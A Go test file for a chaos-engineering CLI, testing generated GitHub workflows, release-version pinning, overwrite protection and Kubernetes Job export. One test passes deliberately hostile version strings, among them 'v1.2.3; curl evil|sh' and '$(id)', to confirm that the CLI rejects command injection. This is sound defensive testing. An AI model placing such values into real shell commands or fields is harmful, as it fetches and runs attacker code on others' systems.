package main

import (
	"io"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"gopkg.in/yaml.v3"
)

// run2 runs the CLI and returns its exit code, stdout and stderr.
func run2(t *testing.T, args ...string) (int, string, string) {
	t.Helper()
	ro, wo, _ := os.Pipe()
	re, we, _ := os.Pipe()
	oldO, oldE := os.Stdout, os.Stderr
	os.Stdout, os.Stderr = wo, we
	code := run(append([]string{"litmus-lite"}, args...))
	_ = wo.Close()
	_ = we.Close()
	os.Stdout, os.Stderr = oldO, oldE
	so, _ := io.ReadAll(ro)
	se, _ := io.ReadAll(re)
	_ = ro.Close()
	_ = re.Close()
	return code, string(so), string(se)
}

func TestCIGithubWritesAWorkflowThatNeedsNothingFromThisRepository(t *testing.T) {
	dir := inTempDir(t)
	code, out, errText := run2(t, "ci", "github")
	if code != 0 {
		t.Fatalf("exit %d: %s", code, errText)
	}
	path := filepath.Join(".github", "workflows", "litmus-lite.yml")
	if strings.TrimSpace(out) != path {
		t.Fatalf("printed %q", out)
	}
	b, err := os.ReadFile(filepath.Join(dir, path))
	if err != nil {
		t.Fatal(err)
	}
	body := string(b)
	// It used to build litmus-lite from this repository's source and validate
	// one of its examples, so it failed in every other repository.
	for _, banned := range []string{"go build", "setup-go", "examples/", "./cmd/"} {
		if strings.Contains(body, banned) {
			t.Errorf("the workflow depends on this repository (%q):\n%s", banned, body)
		}
	}
	for _, want := range []string{"gh release download --repo " + releaseRepo, "sha256sum --check", "validate -strict", "git ls-files '*.chaos.yaml'"} {
		if !strings.Contains(body, want) {
			t.Errorf("missing %q:\n%s", want, body)
		}
	}
	var wf struct {
		Name string `yaml:"name"`
		Jobs map[string]struct {
			Steps []any `yaml:"steps"`
		} `yaml:"jobs"`
	}
	if err := yaml.Unmarshal(b, &wf); err != nil || wf.Name != "litmus-lite" || len(wf.Jobs["validate"].Steps) < 3 {
		t.Fatalf("not a workflow: %v %+v", err, wf)
	}
}

func TestCIGithubPinsAVersionAndRefusesOthers(t *testing.T) {
	inTempDir(t)
	code, _, errText := run2(t, "ci", "github", "-version", "0.3.1")
	if code != 0 {
		t.Fatal(errText)
	}
	b, _ := os.ReadFile(filepath.Join(".github", "workflows", "litmus-lite.yml"))
	if !strings.Contains(string(b), "gh release download v0.3.1 --repo") {
		t.Fatalf("the version is not pinned:\n%s", b)
	}
	// The version goes into a shell command: nothing but a release tag does.
	for _, bad := range []string{"latest", "v1", "v1.2.3; curl evil|sh", "$(id)", "v1.2.3\nrun: x", "1.2.3 --repo x/y"} {
		if code, _, _ := run2(t, "ci", "github", "-force", "-version", bad); code != 2 {
			t.Errorf("-version %q: exit %d", bad, code)
		}
	}
}

func TestCIGithubDoesNotOverwriteWithoutForce(t *testing.T) {
	inTempDir(t)
	path := filepath.Join(".github", "workflows", "litmus-lite.yml")
	_ = os.MkdirAll(filepath.Dir(path), 0o755)
	_ = os.WriteFile(path, []byte("mine\n"), 0o644)
	code, _, errText := run2(t, "ci", "github")
	if code != 1 || !strings.Contains(errText, "-force") {
		t.Fatalf("exit %d: %s", code, errText)
	}
	if b, _ := os.ReadFile(path); string(b) != "mine\n" {
		t.Fatal("an existing workflow was overwritten")
	}
	if code, _, _ := run2(t, "ci", "github", "-force"); code != 0 {
		t.Fatal("-force did not overwrite")
	}
}

const exportScenario = `
apiVersion: litmus-lite.io/v1
kind: Scenario
metadata: { name: shop }
faults:
  - name: slow
    kind: http.latency
    duration: 2s
    params: { listen: "127.0.0.1:18080", upstream: "checkout.shop.svc:8080" }
probes:
  - { name: p, type: http, url: "http://127.0.0.1:18080/" }
`

func TestExportJobNeedsAnImageAndTheRightFlags(t *testing.T) {
	path := writeScenario(t, exportScenario)
	if code, _, errText := run2(t, "export", "job", path); code != 2 || !strings.Contains(errText, "-image") {
		t.Fatalf("without -image: exit %d: %s", code, errText)
	}
	// The Job would be refused (a service host needs -allow-target and -yes):
	// say so now, not as a failed Job.
	code, _, errText := run2(t, "export", "job", "-image", "reg.example/ll:1", path)
	if code != 1 || !strings.Contains(errText, "would refuse") || !strings.Contains(errText, ".svc") {
		t.Fatalf("exit %d: %s", code, errText)
	}
	code, out, errText := run2(t, "export", "job", "-image", "reg.example/ll:1", "-allow-target", "checkout.shop.svc", "-yes", path)
	if code != 0 {
		t.Fatalf("exit %d: %s", code, errText)
	}
	for _, want := range []string{"kind: ConfigMap", "kind: Job", `"-allow-target", "checkout.shop.svc", "-yes"`, `image: "reg.example/ll:1"`} {
		if !strings.Contains(out, want) {
			t.Errorf("missing %q:\n%s", want, out)
		}
	}
	if strings.Contains(out, "ghcr.io") {
		t.Error("the output names an image the project does not publish")
	}
}
